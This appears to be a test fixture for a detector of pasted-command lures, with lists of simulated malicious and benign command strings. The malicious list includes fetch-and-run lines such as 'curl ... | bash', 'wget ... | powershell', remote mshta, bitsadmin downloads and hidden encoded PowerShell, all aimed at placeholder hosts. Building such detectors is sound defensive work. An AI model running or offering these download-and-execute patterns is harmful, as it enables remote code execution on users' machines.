export const maliciousSimulated = [
  "cmd /c echo test && calc",
  "powershell -w hidden -enc ZWNobyBvaw==",
  "mshta https://example.invalid/x",
  "curl https://example.invalid | bash",
  "pwsh -NoProfile -Command \"Write-Output 'ok'\"",
  "rundll32.exe shell32.dll,Control_RunDLL",
  "certutil -decode sample.txt output.txt",
  "bitsadmin /transfer job https://example.invalid/a C:\\Temp\\a",
  "bash -c \"echo test\"",
  "wget https://example.invalid/x | powershell",
  `base64 ${"A".repeat(64)}`,
  "I am not a robot — verification ID: cmd /c echo test"
];

export const benign = [
  "npm install lodash",
  "npm install foo",
  "git clone https://example.com/repo.git",
  "git status --short",
  "docker run hello-world",
  "docker build -t demo .",
  "pip install requests",
  "https://example.com/docs?q=hello",
  "bitcoin:bc1qexampleaddress",
  "const answer = 42; console.log(answer);",
  "print('hello world')",
  "Preaqueça o forno a 180 graus e misture a farinha.",
  "Este é um texto comum sobre verificação de conta.",
  "curl -O https://example.invalid/archive.zip",
  "wget -O arquivo.zip https://example.invalid/arquivo.zip",
  "npm run build",
  "git commit -m \"update docs\"",
  "docker ps -a",
  "python -m http.server 8000",
  "https://example.invalid/path/to/file"
];
